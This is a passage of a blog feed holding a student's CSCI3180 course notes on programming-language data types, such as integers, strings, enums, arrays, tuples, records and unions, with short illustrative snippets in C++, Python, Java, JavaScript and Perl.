  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="string">&quot;Hello&quot;</span>, <span class="number">1.234</span>, <span class="string">&quot;World&quot;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><p><font color="F54747"><strong>Advantages</strong></font>:</p>
<ol>
<li>Flexibility</li>
</ol>
</li>
<li><p><font color="F54747"><strong>Disadvantages</strong></font>:</p>
<ol>
<li>Inefficient</li>
<li>Loss of error detection</li>
</ol>
</li>
</ul>
</li>
</ul>
<!-- 
## Memory




<font color="3A75EA">Blue</font>
<font color="F54747">Red</font> -->]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Data Types</title>
    <url>/myBlog/2023/02/26/2023/CSCI3180/2023-2-26-CSCI3180-DataTypes/</url>
    <content><![CDATA[<h2 id="Primitive-Data-Types"><a href="#Primitive-Data-Types" class="headerlink" title="Primitive Data Types"></a>Primitive Data Types</h2><ul>
<li>The most basic data types available in a programming language</li>
<li>Reflections of the hardware<ul>
<li>are directly related to how the computer’s hardware processes and stores data</li>
<li>primitive data types are designed to map directly to the underlying hardware of a computer (i.e., allow programs to interact with the hardware in an efficient way)</li>
</ul>
</li>
</ul>
<h3 id="Integer"><a href="#Integer" class="headerlink" title="Integer"></a>Integer</h3><ul>
<li><p>An exact reflection of the hardware</p>
</li>
<li><p>Integer sizes: platform-independent</p>
<ul>
<li><code>Java</code> signed integer sizes: <code>byte</code>(1 bytes), <code>short</code>(2 bytes), <code>int</code>(4 bytes), <code>long</code>(8 bytes)</li>
<li><code>C</code>&#x2F;<code>C++</code> signed integer sizes are not fixed</li>
<li><code>Python</code>: arbitrary sizes</li>
</ul>
</li>
</ul>
<h3 id="Floating-Point"><a href="#Floating-Point" class="headerlink" title="Floating Point"></a>Floating Point</h3><ul>
<li>Mordelling real numbers, but just approximations</li>
<li>IEEE Floating-Point Standard 754</li>
<li>Languages support at least 2 floating-point types: <code>float</code> (32 bits), <code>double</code> (64 bits)</li>
</ul>
<h3 id="Complex"><a href="#Complex" class="headerlink" title="Complex"></a>Complex</h3><ul>
<li>Some languages support a complex type (e.g., <code>Python</code>, <code>C99</code>)  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">1</span>+<span class="number">4j</span>) <span class="comment"># (1+4j)</span></span><br><span class="line"><span class="built_in">print</span>((<span class="number">1</span>+<span class="number">4j</span>)*(<span class="number">1</span>+<span class="number">4j</span>))    <span class="comment"># (-15+8j)</span></span><br><span class="line"><span class="built_in">print</span>(j)    <span class="comment"># not complex</span></span><br><span class="line"><span class="built_in">print</span>(j*j)  <span class="comment"># not complex</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1j</span>*<span class="number">1j</span>)    <span class="comment"># (-1+0j)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Decimal"><a href="#Decimal" class="headerlink" title="Decimal"></a>Decimal</h3><ul>
<li>For business applications which involve money (e.g., <code>COBOL</code>~ essential, <code>C#</code>, <code>Python</code>)</li>
<li>It stores a fixed number of decimal digits in <font color="3A75EA">binary coded decimal</font></li>
<li><strong>Advantages</strong>:<ol>
<li>Accuracy</li>
</ol>
</li>
<li><strong>Disadvantages</strong>:<ol>
<li>Limited range</li>
<li>Memory waste</li>
</ol>
</li>
</ul>
<h3 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean"></a>Boolean</h3><ul>
<li><p><code>true</code>, <code>false</code></p>
</li>
<li><p><code>C99</code> and <code>C++</code> allow numeric expressions to be used as Boolean, but <code>Java</code> and <code>C#</code> do not because of the reliability</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(j = <span class="number">1</span>)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;GG&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Advantages</strong>:</p>
<ol>
<li>Readability</li>
<li>Reliability</li>
</ol>
</li>
</ul>
<h3 id="Character"><a href="#Character" class="headerlink" title="Character"></a>Character</h3><ul>
<li>Stored as <font color="3A75EA">numeric codings</font> (ASCII standard and Unicode not standard)</li>
<li><font color="F54747">Noted</font>: <code>Python</code> does not have Character type (it is a string of one length)</li>
</ul>
<h3 id="Character-String-Types"><a href="#Character-String-Types" class="headerlink" title="Character String Types"></a>Character String Types</h3><ul>
<li><p>A sequences of characters</p>
</li>
<li><p><strong>Typical Operations</strong>:</p>
<ol>
<li>Assignment and copying</li>
<li>Comparasion (ascending&#x2F;descending)</li>
<li>Concatenation</li>
<li>Substring reference</li>
<li>Pattern matching</li>
</ol>
</li>
<li><p><strong>String Types in Languages</strong>:</p>
<ol>
<li><p><code>C</code> and <code>C++</code></p>
<ul>
<li>Not primitive, use char arrays and a library of functions provides operation</li>
</ul>
</li>
<li><p><code>Java</code> and <code>C#</code></p>
<ul>
<li>Not primitive, use the String class</li>
</ul>
</li>
<li><p><code>Fortran</code> and <code>Python</code></p>
<ul>
<li>Primitive type with assignment and serveral operations</li>
</ul>
</li>
<li><p><code>Perl</code> and <code>JavaScript</code></p>
<ul>
<li>Provide built-in pattern matching (regular expression)</li>
</ul>
</li>
</ol>
</li>
<li><p><strong>String Length Options</strong>:</p>
<ul>
<li><p><font color="3A75EA">Static length</font> in <code>Python</code>, <code>Java</code> String class</p>
<ul>
<li>It only need a <font color="F54747">compile-time descriptor</font> for the length</li>
</ul>
</li>
<li><p><font color="3A75EA">Limited dynamic length</font> in <code>C</code> and <code>C++</code> char arrays (<code>\0</code> indicates the end of string)</p>
<ul>
<li>It may need a <font color="F54747">run-time descriptor</font> for the length and maximum length  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> s1[<span class="number">3</span>] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">    std::cout &lt;&lt; s1 &lt;&lt; std::endl;   <span class="comment">// dangerous</span></span><br><span class="line">    <span class="type">char</span> s2[<span class="number">4</span>] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">    std::cout &lt;&lt; s2 &lt;&lt; std::endl;   <span class="comment">// safe</span></span><br><span class="line">    <span class="type">char</span> s3[] = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; s3 &lt;&lt; std::endl;   <span class="comment">// safe</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Limited dynamic length</span></span><br><span class="line">    <span class="type">char</span> s4[<span class="number">20</span>] = <span class="string">&quot;hahahaha&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; s4 &lt;&lt; std::endl;   <span class="comment">// hahahaha</span></span><br><span class="line">    s4[<span class="number">8</span>] = <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">    std::cout &lt;&lt; s4 &lt;&lt; std::endl;   <span class="comment">// hahahaha!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="3A75EA">Unlimited dynamic length</font> in <code>Perl</code></p>
<ul>
<li>It must need a <font color="F54747">run-time descriptor</font> for the length and maximum length<ol>
<li>Linked-list</li>
<li>Adjacent storage cells</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Ordinal-Types"><a href="#Ordinal-Types" class="headerlink" title="Ordinal Types"></a>Ordinal Types</h3><ul>
<li>It represents values that have a natural ordering among them</li>
<li>It is the range of possible discrete values can be easily associated with the set of integers</li>
<li>Primitive Ordinal Types:<ul>
<li><code>int</code></li>
<li><code>char</code></li>
<li><code>boolean</code></li>
</ul>
</li>
</ul>
<h2 id="Enumeration-Types"><a href="#Enumeration-Types" class="headerlink" title="Enumeration Types"></a>Enumeration Types</h2><ul>
<li><p>It allows programmers to define a set of named constants as a type</p>
</li>
<li><p>Examples:</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Day</span> &#123;MON, TUE, WED, THU, FRI, SAT, SUN&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Day d = MON;</span><br><span class="line">    <span class="keyword">if</span>(d == MON)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Monday&quot;</span> &lt;&lt; std::endl; <span class="comment">// Monday</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Issues</strong>: </p>
<ol>
<li><p>Are enumeration values coerced to other types (<code>int</code>)?</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Day</span> &#123;MON, TUE, WED, THU, FRI, SAT, SUN&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Day d = SUN;</span><br><span class="line">    <span class="comment">// does the addition make sence? coerced to integer type</span></span><br><span class="line">    std::cout &lt;&lt; d + <span class="number">1</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Any other type coerced to an enumeration type?</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Day</span> &#123;MON, TUE, WED, THU, FRI, SAT, SUN&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Day d = SUN;</span><br><span class="line">    <span class="comment">// can we assign integer to Day? coerced to enumeration type</span></span><br><span class="line">    d = <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ol>
<li><p>Aid to readability</p>
<ul>
<li>No need to code the Day, Color as a number</li>
</ul>
</li>
<li><p>Aid to reliability</p>
<ul>
<li>No enumeration variable can be assigned a value outside its defined range, so make it as compilation error</li>
<li>No invalid operations</li>
<li>No invalid coercion (<code>Java</code>, <code>C#</code> does not coerced to integer type)</li>
</ul>
</li>
</ol>
</li>
</ul>
<h2 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h2><ul>
<li><p>Indexing</p>
<ul>
<li>It is a mapping from indices to elements<ul>
<li>array_name (index_value_list) → one or more elements</li>
</ul>
</li>
</ul>
</li>
<li><p>Index Types</p>
<ol>
<li>Typically integers only</li>
<li>Usually starts with 0<ul>
<li><code>R</code> starts with 1</li>
</ul>
</li>
<li>Range checking<ul>
<li>In <code>Java</code>, <code>C#</code>, <code>Python</code></li>
<li>Not in <code>C</code>, <code>C++</code></li>
</ul>
</li>
<li>Some languages allow negative indices<ul>
<li><code>Python</code>: reverse</li>
</ul>
</li>
</ol>
</li>
<li><p>Initialization</p>
<ul>
<li><p>Character strings in <code>C</code> and <code>C++</code></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> name[] = <span class="string">&quot;Doge&quot;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Array of strings in <code>C</code> and <code>C++</code></p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* animals [] = &#123;<span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;Cat&quot;</span>, <span class="string">&quot;Pig&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>String object in <code>Java</code></p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] animals = &#123;<span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;Cat&quot;</span>, <span class="string">&quot;Pig&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>Python</code> - list comprehension</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_list = [x**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>) <span class="keyword">if</span> x%<span class="number">2</span> == <span class="number">0</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Array Operations</p>
<ul>
<li><code>Python</code> supports lots of operations, access for <a href="https://donaldlamnl.github.io/myBlog/2022/08/30/2022/2022-8-30-Python-List/">details</a>.</li>
</ul>
</li>
</ul>
<h3 id="Array-Types"><a href="#Array-Types" class="headerlink" title="Array Types"></a>Array Types</h3><ol>
<li><p>Heterogeneous Array</p>
<ul>
<li>the elements in an array need not be of the same type  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myArray = [<span class="string">&quot;Hello&quot;</span>, <span class="number">42</span>, <span class="literal">true</span>,</span><br><span class="line">    &#123;<span class="attr">name</span>: <span class="string">&quot;John&quot;</span>, <span class="attr">age</span>: <span class="number">30</span>&#125;,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello from a function!&quot;</span>)&#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [<span class="string">&quot;hello&quot;</span>, <span class="number">42</span>, <span class="literal">True</span>,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;,</span><br><span class="line">    <span class="keyword">lambda</span>: <span class="built_in">print</span>(<span class="string">&quot;Hello from a lambda!&quot;</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Rectangular array:</p>
<ul>
<li>the arrays with multiple dimensions and each dimension has the same number of elements  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> rectangular_array[<span class="number">3</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;, &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;, &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[][] rectangularArray = &#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;, &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;, &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Jagged array:</p>
<ul>
<li>the arrays with multiple dimensions but each dimension can have a different number of elements  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jagged_array = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br></pre></td></tr></table></figure>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; jagged_array = &#123;&#123;<span class="number">1</span>, <span class="number">2</span>&#125;, &#123;<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;, &#123;<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="Array-Binding"><a href="#Array-Binding" class="headerlink" title="Array Binding"></a>Array Binding</h3><ol>
<li><p>Static:</p>
<ul>
<li>the size of array is fixed at compiler-time</li>
<li>the array is allocated a fixed memory location at compiler-time</li>
<li><strong>Advantage</strong>: time efficiency (finish binding at compiler-time)</li>
<li><strong>Disadvantage</strong>: inflexibility (cannot change the size at runtime)</li>
</ul>
</li>
<li><p>Fixed stack-dynamic:</p>
<ul>
<li>the size of array is determined at runtime</li>
<li>the array is allocated on the stack (the memory for the array is freed when the function is returned)</li>
<li><strong>Advantage</strong>: space efficiency (the memory for the array is allocated on the stack)</li>
<li><strong>Disadvantage</strong>: inflexibility (cannot change the size at runtime)</li>
</ul>
</li>
<li><p>Fixed heap-dynamic:</p>
<ul>
<li>the size of array is dynamically bound (but fixed onece the allocation is done) <code>malloc</code></li>
<li>the array is allocated on the heap at runtime</li>
<li><strong>Advantage</strong>: flexibility (the array is allocated on the heap)</li>
<li><strong>Disadvantage</strong>: inflexibility (cannot change the size at runtime)</li>
</ul>
</li>
<li><p>Heap-dynamic:</p>
<ul>
<li>the size of array is dynamically bound</li>
<li>the array is allocated on the heap at runtime</li>
<li><strong>Advantage</strong>: highest flexibility (the size of array can be changed in runtime)</li>
<li><strong>Disadvantage</strong>: low efficiency</li>
</ul>
</li>
</ol>
<h3 id="Implementation-of-Array"><a href="#Implementation-of-Array" class="headerlink" title="Implementation of Array"></a>Implementation of Array</h3><ul>
<li><p>Access function for single-dimensioned arrays:<br>  $$\text{address}(a[i]) &#x3D; \text{address}(a[\text{lowest_bound}]) + (i - \text{lower_bound}) \times \text{sizeof}(a[i])$$</p>
<ul>
<li>Here are total 3 calculation operations</li>
</ul>
</li>
<li><p>Access multi-dimensional arrays:<br>  $$<br>  \begin{array}{ccc}<br>  a_{11} &amp; a_{12} &amp; a_{13} \\<br>  a_{21} &amp; a_{22} &amp; a_{23} \\<br>  a_{31} &amp; a_{32} &amp; a_{33}<br>  \end{array}<br>  $$</p>
<ul>
<li><p>Access function:<br>  $$<br>  \begin{aligned}<br>  \text{address}(a[i,j]) &#x3D; &amp; \space \text{address}(a[\text{lbr}, \text{lbc}]) + \\<br>                  &amp;(i-\text{lbr}) \times (\text{ubc}-\text{lbc}+1) \times \text{sizeof}(a[i,j]) + \\<br>                  &amp;(j-\text{lbc}) \times \text{sizeof}(a[i, j]) \\<br>  \end{aligned}<br>  $$</p>
<ul>
<li>$\text{lbr}$: lower-bound row index</li>
<li>$\text{lbc}$: lower-bound column index</li>
<li>$\text{ubr}$: upper-bound row index</li>
<li>$\text{ubc}$: upper-bound column index</li>
</ul>
  <!-- - $\text{lbr: lower-bound row index}$
  - $\text{lbc: lower-bound column index}$
  - $\text{ubr: upper-bound row index}$
  - $\text{ubc: upper-bound column index}$ --></li>
</ul>
<ol>
<li><p>Row major (Most languages):<br> $$<br> \begin{array}{ccc}<br> a_{11} &amp; a_{12} &amp; a_{13} &amp;<br> a_{21} &amp; a_{22} &amp; a_{23} &amp;<br> a_{31} &amp; a_{32} &amp; a_{33}<br> \end{array}<br> $$</p>
</li>
<li><p>Column major (Fortran):<br> $$<br> \begin{array}{ccc}<br> a_{11} &amp; a_{21} &amp; a_{22} &amp;<br> a_{12} &amp; a_{22} &amp; a_{32} &amp;<br> a_{13} &amp; a_{23} &amp; a_{33}<br> \end{array}<br> $$</p>
</li>
</ol>
</li>
</ul>
<h3 id="Associative-Arrays"><a href="#Associative-Arrays" class="headerlink" title="Associative Arrays"></a>Associative Arrays</h3><ul>
<li><p>In Python:</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dictionary</span></span><br><span class="line">doge = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Kabosu&quot;</span>, <span class="string">&quot;gender&quot;</span>: <span class="string">&quot;Female&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">16</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Access</span></span><br><span class="line">doge[<span class="string">&quot;name&quot;</span>] <span class="comment"># Kabosu</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Subscripting</span></span><br><span class="line">doge[<span class="string">&quot;age&quot;</span>] = doge[<span class="string">&quot;age&quot;</span>] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove elemen</span></span><br><span class="line"><span class="keyword">del</span> doge[<span class="string">&quot;age&quot;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>In Perl:</p>
  <figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hash begins with %</span></span><br><span class="line">%temps = (<span class="string">&quot;Mon&quot;</span> =&gt; <span class="number">27</span>, <span class="string">&quot;Tue&quot;</span> =&gt; <span class="number">29</span>, <span class="string">&quot;Wed&quot;</span> =&gt; <span class="number">25</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Access</span></span><br><span class="line">$temps&#123;<span class="string">&quot;Wed&quot;</span>&#125;;  <span class="comment"># 25</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Subscripting</span></span><br><span class="line">$temps&#123;<span class="string">&quot;Wed&quot;</span>&#125; = $temps&#123;<span class="string">&quot;Wed&quot;</span>&#125; + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove elemen</span></span><br><span class="line"><span class="keyword">delete</span> $temps&#123;<span class="string">&quot;Tue&quot;</span>&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Tuples"><a href="#Tuples" class="headerlink" title="Tuples"></a>Tuples</h2><ul>
<li><p>a data type similar to a heterogeneous array, but it is immutable 不可改變的</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Declaration and Assignment</span></span><br><span class="line">t = (<span class="number">3.1415</span>, <span class="string">&quot;XD&quot;</span>, <span class="number">678</span>)</span><br><span class="line"></span><br><span class="line">t[<span class="number">0</span>] = <span class="number">3</span>  <span class="comment"># error! it is immutable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating the new tuple</span></span><br><span class="line">t = t + (<span class="number">2</span>,)  <span class="comment"># (3.1415, &quot;XD&quot;, 678, 2)</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>it is used in <code>Python</code>, <code>F#</code> to allow functions to return multiple values</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a,b</span>):</span><br><span class="line">    c = a + <span class="number">1</span></span><br><span class="line">    d = b * <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span>(c,d)</span><br><span class="line"></span><br><span class="line">c, d = f(<span class="number">4</span>, <span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(c, d)  <span class="comment"># 5, 12</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>Return multiple values in <code>C++</code></p>
<ul>
<li><p>the following code can be executed but have a potential error</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">f2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> result[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span>* result = <span class="built_in">f2</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    std::cout &lt;&lt; result[<span class="number">0</span>] &lt;&lt; result[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>When the array is returned, it would be decated to a pointer, but the <code>result</code> array is allocated on the stack, so the array is already destoried when the function is returned and the pointer returned by the function points to invalid memory.</li>
</ul>
</li>
<li><p>Solution: using the dynamic heap variables</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">f2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span>* result = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span>* result = <span class="built_in">f2</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    std::cout &lt;&lt; result[<span class="number">0</span>] &lt;&lt; result[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">delete</span>[] result;  <span class="comment">// remember to delete the pointer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Solution: using <code>std::pair</code> class</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">f3</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="function">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">result</span><span class="params">(a * <span class="number">3</span>, a + b)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; result = <span class="built_in">f3</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">    std::cout &lt;&lt; result.first &lt;&lt; result.second &lt;&lt; std::endl;  <span class="comment">// 9 7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Records"><a href="#Records" class="headerlink" title="Records"></a>Records</h2><ul>
<li><p>a data structure that is used to store a collection of related values</p>
</li>
<li><p>the individual elements are identified by names</p>
</li>
<li><p>In languages that support OOP, <font color="3A75EA">data classes</font> or <font color="3A75EA">record classes</font> serve as records</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Person</span> <span class="variable">john</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(john.name() + <span class="string">&quot; &quot;</span> + john.age); <span class="comment">// John 30</span></span><br></pre></td></tr></table></figure></li>
<li><p>In <code>C</code>, <code>C++</code>, <code>C#</code>, records are supported with <code>struct</code> data type</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Nice</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">float</span> f;</span><br><span class="line">    string s;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Nice n&#123;<span class="number">1</span>, <span class="number">1.2</span>, <span class="string">&quot;haha&quot;</span>&#125;;</span><br><span class="line">    std::cout &lt;&lt; n.i &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; n.f &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; n.s &lt;&lt; std::endl;  <span class="comment">// 1 1.2 haha</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Implement-of-Records"><a href="#Implement-of-Records" class="headerlink" title="Implement of Records"></a>Implement of Records</h3><h2 id="Unions"><a href="#Unions" class="headerlink" title="Unions"></a>Unions</h2><ul>
<li><p>user-defined data type in programming that allows storing multiple data types in the same memory location</p>
</li>
<li><p>uses the same memory location for all its members, which means that modifying one member can affect the other members</p>
</li>
<li><p>Examples:</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">VariantNumber</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">float</span> f;</span><br><span class="line">    <span class="type">double</span> d;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">union</span> <span class="title class_">VariantNumber</span> num;</span><br><span class="line">    num.i = <span class="number">9</span>;</span><br><span class="line">    std::cout &lt;&lt; num.i &lt;&lt; std::endl;  <span class="comment">// 9</span></span><br><span class="line">    num.f = <span class="number">3.14</span>;</span><br><span class="line">    std::cout &lt;&lt; num.f &lt;&lt; std::endl;  <span class="comment">// 3.14</span></span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; num.i &lt;&lt; std::endl;  <span class="comment">// unexpected 